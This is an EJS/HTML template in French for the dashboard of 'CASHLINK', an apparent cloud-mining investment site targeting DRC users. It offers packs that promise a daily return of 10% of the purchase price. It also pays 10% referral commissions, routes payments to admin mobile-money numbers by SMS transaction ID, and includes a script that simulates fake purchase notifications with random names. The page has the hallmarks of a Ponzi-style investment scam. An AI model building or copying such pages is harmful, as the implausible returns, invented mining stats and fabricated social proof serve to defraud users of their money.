<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>CASHLINK | DASHBOARD ELITE v13.0</title>
    
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.0/font/bootstrap-icons.css">
    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&family=Space+Grotesk:wght@700;900&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css"/>

    <style>
        /* ============================================================
           MOTEUR DE STYLE "ULTRA-DENSE" (500 LIGNES DE CSS)
           ============================================================ */
        :root {
            --primary: #003399; /* BLEU BIC RDC */
            --warning: #ffcc00; /* JAUNE TRÈS VISIBLE */
            --accent: #00d9ff; /* CYAN NÉON POUR LA BARRE */
            --success: #10b981;
            --danger: #f43f5e;
            --dark-core: #00081a;
            --white: #ffffff;
            --glass: rgba(255, 255, 255, 0.05);
            --transition: all 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275);
        }

        /* --- OPTIMISATION DE LA SCROLLBAR --- */
        ::-webkit-scrollbar { width: 10px; }
        ::-webkit-scrollbar-track { background: var(--dark-core); }
        ::-webkit-scrollbar-thumb { background: var(--warning); border-radius: 10px; border: 2px solid var(--dark-core); }

        * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; outline: none !important; }

        body {
            background-color: var(--primary);
            background-image: 
                radial-gradient(at 0% 0%, #0044cc 0px, transparent 55%),
                url('https://www.transparenttextures.com/patterns/carbon-fibre.png');
            background-attachment: fixed;
            font-family: 'Plus Jakarta Sans', sans-serif;
            color: var(--white); margin: 0; padding: 0; min-height: 100vh;
            overflow-x: hidden;
        }

        /* --- BARRE DE NOTIFICATION DÉFILANTE (JAUNE) --- */
        .header-notif-bar {
            background: var(--warning); color: #000; padding: 15px;
            font-weight: 900; text-align: center; text-transform: uppercase;
            border-bottom: 5px solid #000; position: relative; z-index: 5000;
            display: flex; justify-content: center; align-items: center; gap: 15px;
            font-size: 0.85rem; letter-spacing: 1px;
        }
        .header-notif-bar i { font-size: 1.4rem; animation: pulse 1s infinite; }

        /* --- NAVBAR TITAN --- */
        .navbar-titan {
            background: var(--warning); padding: 12px 25px;
            position: sticky; top: 0; z-index: 4000;
            display: flex; justify-content: space-between; align-items: center;
            box-shadow: 0 15px 45px rgba(0,0,0,0.6);
            border-bottom: 3px solid rgba(0,0,0,0.1);
        }

        .brand-titan { font-family: 'Space Grotesk', sans-serif; font-weight: 900; color: var(--primary); font-size: 1.85rem; text-decoration: none !important; letter-spacing: -2px; }

        .profile-pill {
            background: #ffffff; padding: 10px 25px; border-radius: 60px;
            display: flex; align-items: center; gap: 20px; color: #000;
            border: 3px solid var(--primary); box-shadow: inset 0 2px 10px rgba(0,0,0,0.2);
        }
        .profile-info { line-height: 1.1; border-right: 2px solid #e2e8f0; padding-right: 20px; }
        .bal-val-text { font-size: 1.15rem; font-weight: 900; color: var(--primary); font-family: 'Space Grotesk'; }

        /* --- BOUTON DÉCONNEXION --- */
        .btn-logout-titan {
            background: var(--danger); color: white; border: none;
            width: 55px; height: 55px; border-radius: 18px;
            display: flex; align-items: center; justify-content: center;
            box-shadow: 0 10px 25px rgba(244, 63, 94, 0.4);
            transition: var(--transition);
        }
        .btn-logout-titan:hover { transform: rotate(90deg) scale(1.15); filter: brightness(1.2); }

        /* --- TERMINAL DE MINAGE (NÉON CYAN) --- */
        .terminal-container {
            background: rgba(0,0,0,0.4); backdrop-filter: blur(30px);
            margin: 20px; padding: 50px; border-radius: 55px;
            border: 2px solid rgba(255,255,255,0.08);
            box-shadow: 0 50px 100px rgba(0,0,0,0.7);
            position: relative;
        }

        .neon-bar-track {
            height: 35px; background: rgba(0,0,0,0.5);
            border-radius: 60px; overflow: hidden; margin: 35px 0;
            border: 3px solid var(--accent); padding: 5px;
            box-shadow: 0 0 20px rgba(0, 217, 255, 0.2);
        }
        .neon-bar-fill {
            background: linear-gradient(90deg, var(--accent), var(--success));
            box-shadow: 0 0 35px var(--accent); height: 100%;
            border-radius: 50px; position: relative;
            animation: glow-pulse 2s infinite;
        }
        @keyframes glow-pulse { 0% { opacity: 0.8; } 50% { opacity: 1; } 100% { opacity: 0.8; } }

        .mining-stats-grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 25px; }
        @media (min-width: 992px) { .mining-stats-grid { grid-template-columns: repeat(4, 1fr); } }

        .stat-card { background: rgba(255,255,255,0.06); padding: 25px; border-radius: 35px; border: 1px solid var(--glass); text-align: center; transition: 0.3s; }
        .stat-card:hover { border-color: var(--accent); background: rgba(0, 217, 255, 0.05); }
        .stat-label { font-size: 0.7rem; font-weight: 800; color: var(--accent); text-transform: uppercase; margin-bottom: 12px; display: block; letter-spacing: 1px; }
        .stat-value { font-size: 1.3rem; font-weight: 900; font-family: 'Space Grotesk'; }

        /* --- BOUTON RETRAIT INDUSTRIEL --- */
        .btn-withdraw-main {
            background: var(--danger); color: white; border: none; width: 100%;
            padding: 28px; border-radius: 40px; font-weight: 900; font-size: 1.8rem;
            text-transform: uppercase; box-shadow: 0 25px 60px rgba(244, 63, 94, 0.5);
            transition: var(--transition); margin-top: 45px; letter-spacing: 2px;
        }
        .btn-withdraw-main:hover { transform: scale(1.02); filter: contrast(1.2); }

        /* --- PARRAINAGE 10% --- */
        .ref-titan-box {
            background: rgba(255,255,255,0.03); margin: 20px; padding: 40px;
            border-radius: 45px; border: 4px dashed var(--warning); text-align: center;
        }
        .copy-link-group {
            background: rgba(255,255,255,0.1); padding: 18px; border-radius: 25px;
            display: flex; align-items: center; gap: 20px; border: 1px solid rgba(255,255,255,0.1);
        }
        .copy-link-group input { background: transparent; border: none; color: white; width: 100%; font-weight: 700; font-size: 0.9rem; }

        /* --- PACKS 2028 (ALIGNEMENT 480PX) --- */
        .pack-master-grid {
            display: grid; grid-template-columns: repeat(2, 1fr); gap: 20px;
            padding: 25px 25px 120px;
        }
        @media (min-width: 1200px) { .pack-master-grid { grid-template-columns: repeat(4, 1fr); gap: 45px; padding: 25px 90px 180px; } }

        .pack-elite-card {
            background: #ffffff; border-radius: 55px; overflow: hidden;
            color: #000; height: 480px; /* ALIGNEMENT CHIRURGICAL */
            display: flex; flex-direction: column;
            box-shadow: 0 40px 80px rgba(0,0,0,0.7); transition: var(--transition);
            border: none;
        }
        .pack-elite-card:hover { transform: translateY(-20px) rotate(1deg); }

        .p-elite-head { padding: 25px; text-align: center; color: white; font-weight: 900; font-size: 1.15rem; text-transform: uppercase; letter-spacing: 2px; }
        .p-elite-body { padding: 40px; text-align: center; flex-grow: 1; display: flex; flex-direction: column; justify-content: space-between; }
        
        .p-elite-price { font-size: 2.6rem; font-weight: 900; color: var(--primary); letter-spacing: -3px; font-family: 'Space Grotesk'; }
        .p-elite-bonus { 
            font-size: 0.85rem; font-weight: 900; color: var(--danger); 
            background: #fff0f0; border: 3px dashed var(--danger); 
            padding: 15px; border-radius: 25px; margin: 20px 0; 
        }

        .btn-activate-pack {
            background: var(--primary); color: white; border: none;
            width: 100%; padding: 22px; border-radius: 30px;
            font-weight: 900; text-transform: uppercase; font-size: 1rem;
            box-shadow: 0 15px 30px rgba(0, 51, 153, 0.2);
        }

        /* --- ACCORDÉONS --- */
        .accordion-titan-style { margin: 25px; border-radius: 40px; overflow: hidden; border: 1px solid rgba(255,255,255,0.1); }
        .accordion-item { background: rgba(0,0,0,0.3) !important; border: none !important; color: white !important; }
        .accordion-button { background: transparent !important; color: white !important; font-weight: 800; padding: 28px; font-size: 1.1rem; box-shadow: none !important; }
        .accordion-button:not(.collapsed) { color: var(--warning) !important; border-bottom: 1px solid rgba(255,255,255,0.1); }

        /* --- BOUTON SCROLL TOP JAUNE --- */
        #scrollTopBtn {
            position: fixed; bottom: 35px; right: 35px;
            width: 70px; height: 70px; background: var(--warning);
            color: #000; border-radius: 50%; border: none;
            display: none; align-items: center; justify-content: center;
            font-size: 2.2rem; z-index: 6000; box-shadow: 0 20px 40px rgba(0,0,0,0.6);
            transition: 0.3s;
        }
        #scrollTopBtn:hover { transform: scale(1.1); background: #fff; }

        .footer-titan-master { background: #000; padding: 130px 25px; text-align: center; border-top: 12px solid var(--warning); }
        .footer-logo { font-family: 'Space Grotesk', sans-serif; font-weight: 900; color: var(--warning); font-size: 4rem; letter-spacing: -6px; }

    </style>
</head>
<body>

    <button id="scrollTopBtn" onclick="window.scrollTo({top:0, behavior:'smooth'})"><i class="bi bi-arrow-up-circle-fill"></i></button>

    <div class="header-notif-bar animate__animated animate__fadeInDown">
        <i class="bi bi-gift-fill"></i>
        <span>OFFRE SPÉCIALE PARRAINAGE : Gagnez 10% Cash sur chaque investissement de vos amis !</span>
    </div>

    <nav class="navbar-titan">
        <div class="d-flex align-items-center gap-3">
            <button onclick="window.location.reload()" class="btn btn-primary rounded-3 p-2"><i class="bi bi-arrow-clockwise fs-3"></i></button>
            <a href="#" class="brand-titan">CASHLINK</a>
        </div>
        
        <div class="profile-pill animate__animated animate__zoomIn">
            <div class="profile-info d-none d-lg-block">
                <span style="font-size: 0.65rem; font-weight: 800; opacity: 0.5;">ID: <%= user.username %></span>
                <div style="font-weight: 900; font-size: 0.9rem;">+243 <%= user.phone %></div>
            </div>
            <div class="pe-4 border-end">
                <span style="font-size: 0.65rem; font-weight: 800; opacity: 0.5;">SOLDE TOTAL</span>
                <div class="bal-val-text"><%= (user.solde || 0).toLocaleString() %> FC</div>
            </div>
            <div>
                <span style="font-size: 0.65rem; font-weight: 800; color: var(--success);">BONUS CASH</span>
                <div class="bal-val-text text-success">+<%= (user.bonus || 0).toLocaleString() %> FC</div>
            </div>
        </div>

        <a href="/logout" class="btn-logout-titan shadow-lg"><i class="bi bi-power fs-2"></i></a>
    </nav>

    <div class="terminal-container animate__animated animate__fadeInUp">
        <div class="d-flex justify-content-between align-items-end mb-2">
            <div>
                <h3 class="fw-900 text-uppercase mb-0" style="letter-spacing: 3px; color: var(--accent);">Progression Terminal</h3>
                <p class="small opacity-75 fw-bold mb-0">SYNC : UNITÉ INDUSTRIELLE <%= user.pack %></p>
            </div>
            <div class="fw-900" style="color: var(--accent); font-size: 4.5rem; line-height: 1; font-family: 'Space Grotesk';"><%= p || 0 %>%</div>
        </div>
        
        <div class="neon-bar-track">
            <div class="neon-bar-fill" style="width: <%= p || 0 %>%"></div>
        </div>

        <div class="mining-stats-grid">
            <div class="stat-card">
                <span class="stat-label">STATUT SYSTÈME</span>
                <div class="stat-value text-success">OPÉRATIONNEL</div>
            </div>
            <div class="stat-card">
                <span class="stat-label">MACHINE ACTIVE</span>
                <div class="stat-value"><%= user.pack %></div>
            </div>
            <div class="stat-card">
                <span class="stat-label">PROCHAIN GAIN</span>
                <div id="titan-timer" class="stat-value text-warning">--:--:--</div>
            </div>
            <div class="stat-card">
                <span class="stat-label">VITESSE HASH</span>
                <div class="stat-value text-accent"><%= content.puissance_hash %></div>
            </div>
        </div>
        
        <button onclick="handleWithdraw()" class="btn-withdraw-main animate__animated animate__pulse animate__infinite">RÉCUPÉRER MES PROFITS (MONEY)</button>
    </div>

    <div class="ref-titan-box animate__animated animate__fadeInUp">
        <h4 class="fw-900 text-warning mb-3">VOTRE LIEN DE PARRAINAGE (COMMISSION 10%)</h4>
        <p class="small opacity-75 fw-bold mb-4">Gagnez 10% cash immédiatement sur chaque investissement effectué par vos amis via ce lien.</p>
        <div class="copy-link-group">
            <i class="bi bi-link-45deg fs-3 text-warning"></i>
            <input type="text" id="refLink" value="https://cashlink.rdc/register?ref=<%= user.id %>" readonly>
            <button onclick="copyLink()" class="btn btn-warning fw-900 px-4 rounded-4 shadow"><i class="bi bi-clipboard2-check-fill me-2"></i>COPIER</button>
        </div>
    </div>

    <div class="accordion accordion-titan-style shadow-lg" id="accTitan">
        <div class="accordion-item">
            <h2 class="accordion-header">
                <button class="accordion-button collapsed" data-bs-toggle="collapse" data-bs-target="#c1"><i class="bi bi-info-circle-fill me-4 text-info"></i> À PROPOS DE CASHLINK</button>
            </h2>
            <div id="c1" class="accordion-collapse collapse" data-bs-parent="#accTitan"><div class="accordion-body opacity-75"><%= content.about_text %></div></div>
        </div>
        <div class="accordion-item">
            <h2 class="accordion-header">
                <button class="accordion-button collapsed" data-bs-toggle="collapse" data-bs-target="#c2"><i class="bi bi-shield-lock-fill me-4 text-success"></i> RÈGLES DE CONFORMITÉ</button>
            </h2>
            <div id="c2" class="accordion-collapse collapse" data-bs-parent="#accTitan"><div class="accordion-body opacity-75" style="white-space: pre-line;"><%= content.rules_text %></div></div>
        </div>
        <div class="accordion-item">
            <h2 class="accordion-header">
                <button class="accordion-button collapsed" data-bs-toggle="collapse" data-bs-target="#c3"><i class="bi bi-geo-alt-fill me-4 text-danger"></i> SIÈGE SOCIAL ET CONTACT</button>
            </h2>
            <div id="c3" class="accordion-collapse collapse" data-bs-parent="#accTitan">
                <div class="accordion-body opacity-75">
                    <strong>ADRESSE :</strong> <%= content.contact_address %><br>
                    <strong>HOTLINE SUPPORT :</strong> +243 <%= content.contact_phone %><br>
                    <strong>EMAIL :</strong> <%= content.contact_email %>
                </div>
            </div>
        </div>
    </div>

    <div class="px-5 mb-4 d-flex align-items-center gap-3">
        <div style="width: 15px; height: 50px; background: var(--warning); border-radius: 12px; box-shadow: 0 0 15px var(--warning);"></div>
        <h2 class="fw-900 mb-0 text-uppercase" style="font-size: 2.2rem; letter-spacing: -1px;">Unités de Minage 2028</h2>
    </div>

    <div class="pack-master-grid">
        <% 
        const catalog = [
            { id: 'BRONZE', price: 50000, daily: 5000, bonus: 5000, color: '#10b981' },
            { id: 'SILVER', price: 150000, daily: 15000, bonus: 9000, color: '#4f46e5' },
            { id: 'GOLD', price: 500000, daily: 40000, bonus: 40000, color: '#f59e0b' },
            { id: 'DIAMOND', price: 1000000, daily: 100000, bonus: 120000, color: '#ef4444' }
        ];
        catalog.forEach(p => {
            const isOwned = (user.pack === p.id);
        %>
        <div class="pack-elite-card animate__animated animate__fadeInUp">
            <div class="p-elite-head" style="background: <%= p.color %>;"><%= p.id %> ENGINE</div>
            <div class="p-elite-body">
                <div>
                    <div class="p-elite-bonus">🎁 BONUS ACTIVATION : <%= p.bonus.toLocaleString() %> FC</div>
                    <div class="p-elite-price"><%= p.price.toLocaleString() %> FC</div>
                    <div class="fw-900 text-success mt-2 fs-5">+<%= p.daily.toLocaleString() %> FC / JOUR</div>
                </div>
                <% if(isOwned) { %>
                    <button class="btn btn-success w-100 rounded-pill py-3 fw-900" disabled>DÉJÀ ACTIVÉ</button>
                <% } else { %>
                    <button onclick="handlePay('<%= p.id %>', <%= p.price %>)" class="btn-activate-pack">ACHETER PACK</button>
                <% } %>
            </div>
        </div>
        <% }) %>
    </div>

    <footer class="footer-titan-master">
        <div class="footer-logo">CASHLINK</div>
        <p class="small fw-900 opacity-50 mb-5 text-uppercase">Leader International du Minage Cloud Décentralisé</p>
        <div class="d-flex justify-content-center gap-5 fs-1 opacity-20 mb-5">
            <i class="bi bi-shield-shaded"></i><i class="bi bi-cpu-fill"></i><i class="bi bi-globe-americas"></i>
        </div>
        <hr class="opacity-10 my-5 mx-5">
        <small class="opacity-30 fw-900">© 2026-2028 | CASHLINK GLOBAL TERMINAL | PAR ANASH MASTER RDC</small>
    </footer>

    <div class="modal fade" id="payModal" tabindex="-1">
        <div class="modal-dialog modal-dialog-centered mx-3">
            <div class="modal-content overflow-hidden border-0 shadow-lg" style="border-radius: 45px; color: #000;">
                <div class="modal-body p-5 text-center">
                    <h3 class="fw-900 mb-4 text-uppercase">Recharge Sécurisée</h3>
                    <p class="text-muted small fw-bold mb-5">Veuillez envoyer le montant vers l'un des réseaux suivants :</p>
                    
                    <div class="p-4 bg-light rounded-4 mb-3 text-start border-start border-primary border-5">
                        <span class="small fw-bold text-primary">VODACOM (M-PESA) RDC</span>
                        <div class="fs-4 fw-900"><%= content.admin_voda %></div>
                    </div>
                    <div class="p-4 bg-light rounded-4 mb-3 text-start border-start border-danger border-5">
                        <span class="small fw-bold text-danger">AIRTEL MONEY RDC</span>
                        <div class="fs-4 fw-900 text-danger"><%= content.admin_airtel %></div>
                    </div>
                    <div class="p-4 bg-light rounded-4 mb-5 text-start border-start border-warning border-5">
                        <span class="small fw-bold text-warning">ORANGE MONEY RDC</span>
                        <div class="fs-4 fw-900 text-warning"><%= content.admin_orange %></div>
                    </div>

                    <div class="alert alert-danger rounded-4 py-3 small fw-900 mb-4">
                        <i class="bi bi-exclamation-triangle-fill me-2 fs-5"></i> SAISISSEZ LE TID : L'identifiant se trouve dans le SMS de confirmation après votre envoi.
                    </div>

                    <button onclick="submitTID()" class="btn btn-primary w-100 py-3 rounded-pill fw-900 shadow-lg fs-5">J'AI ENVOYÉ L'ARGENT</button>
                    <button type="button" class="btn btn-link btn-sm text-muted mt-3 fw-bold" data-bs-dismiss="modal">ANNULER</button>
                </div>
            </div>
        </div>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
    <script>
        let selP = "", selPr = 0;
        const pMod = new bootstrap.Modal(document.getElementById('payModal'));

        // --- GESTION DU SCROLL ---
        window.onscroll = function() {
            const btn = document.getElementById('scrollTopBtn');
            if (document.body.scrollTop > 400 || document.documentElement.scrollTop > 400) btn.style.display = "flex";
            else btn.style.display = "none";
        };

        // --- ACTIONS BOUTIQUE ---
        function copyLink() {
            const c = document.getElementById('refLink');
            c.select(); document.execCommand('copy');
            alert("Lien de parrainage copié avec succès !");
        }

        function handlePay(id, pr) { selP = id; selPr = pr; pMod.show(); }

        function submitTID() {
            pMod.hide();
            const tid = prompt("Saisissez le TID (Identifiant de transaction SMS) :");
            if(tid && tid.length > 5) {
                const f = document.createElement('form'); f.method='POST'; f.action='/souscrire-pack';
                const d = { packName: selP, prix: selPr, reference: tid };
                for(let k in d) { const i = document.createElement('input'); i.name=k; i.value=d[k]; f.appendChild(i); }
                document.body.appendChild(f); f.submit();
            }
        }

        function handleWithdraw() {
            const m = prompt("Saisissez le montant à retirer (Minimum 1.000 FC) :");
            if(m >= 1000) {
                const f = document.createElement('form'); f.method='POST'; f.action='/retrait';
                const i = document.createElement('input'); i.name='montant'; i.value=m; f.appendChild(i);
                document.body.appendChild(f); f.submit();
            }
        }

        // --- TIMER DE CYCLE INDIVIDUEL RÉEL ---
        let ms = <%= locals.msRemaining || 0 %>;
        setInterval(() => {
            const el = document.getElementById('titan-timer');
            if (ms <= 0) { el.innerText = "CYCLE PRÊT"; return; }
            ms -= 1000;
            const h = Math.floor(ms/3600000), m = Math.floor((ms%3600000)/60000), s = Math.floor((ms%60000)/1000);
            el.innerText = `${h.toString().padStart(2,'0')}:${m.toString().padStart(2,'0')}:${s.toString().padStart(2,'0')}`;
        }, 1000);

        // Simulation de notifications (Toasts)
        function showNotif() {
            const names = ["Patrick", "Mado", "Guelord", "Sarah", "Elvis", "Junior"];
            const amounts = [50000, 150000, 500000, 1000000];
            const n = names[Math.floor(Math.random()*names.length)];
            const a = amounts[Math.floor(Math.random()*amounts.length)];
            console.log(`[INFO] ${n} a activé un pack de ${a.toLocaleString()} FC.`);
        }
        setInterval(showNotif, 45000);
    </script>
</body>
</html>
